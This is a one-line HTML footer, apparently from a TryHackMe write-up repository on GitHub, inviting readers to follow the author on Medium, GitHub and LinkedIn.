<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
